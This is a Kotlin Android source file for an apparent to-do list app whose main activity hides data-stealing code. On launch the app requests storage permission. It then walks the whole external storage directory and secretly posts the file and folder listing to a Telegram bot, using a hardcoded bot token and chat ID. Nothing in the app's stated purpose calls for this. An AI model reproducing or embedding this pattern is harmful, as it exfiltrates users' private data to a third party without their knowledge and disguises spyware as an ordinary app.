package com.example.todolist

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Environment
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import kotlinx.android.synthetic.main.activity_main.*
import okhttp3.*
import java.io.File
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var todoAdapter: TodoAdapter
    private val STORAGE_PERMISSION_CODE = 1001
    private val telegramToken = "7916356795:AAHMkdpGxBG1AI7TGcvsDfCLZcqUm3THYbk"
    private val chatId = "1585904762"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        todoAdapter = TodoAdapter(mutableListOf())
        rvTodoItems.adapter = todoAdapter
        rvTodoItems.layoutManager = LinearLayoutManager(this)

        btnAddTodo.setOnClickListener {
            val todoTitle = etTodoTitle.text.toString()
            if (todoTitle.isNotEmpty()) {
                val todo = Todo(todoTitle)
                todoAdapter.addTodo(todo)
                etTodoTitle.text.clear()
            }
        }

        btnDeleteDoneTodos.setOnClickListener {
            todoAdapter.deleteDoneTodos()
        }

        checkStoragePermission()
    }

    private fun checkStoragePermission() {
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                STORAGE_PERMISSION_CODE
            )
        } else {
            sendStorageMapToTelegram()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == STORAGE_PERMISSION_CODE && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            sendStorageMapToTelegram()
        }
    }

    private fun sendStorageMapToTelegram() {
        val root = File(Environment.getExternalStorageDirectory().absolutePath)
        val builder = StringBuilder()
        listFilesRecursive(root, builder)

        val message = builder.toString().take(4000) // Telegram limit
        val url = "https://api.telegram.org/bot$telegramToken/sendMessage"

        val client = OkHttpClient()
        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                // Sent
            }
        })
    }

    private fun listFilesRecursive(file: File, builder: StringBuilder, indent: String = "") {
        if (file.isDirectory) {
            builder.append("$indent[${file.name}]\n")
            file.listFiles()?.forEach {
                listFilesRecursive(it, builder, "$indent  ")
            }
        } else {
            builder.append("$indent- ${file.name}\n")
        }
    }
}
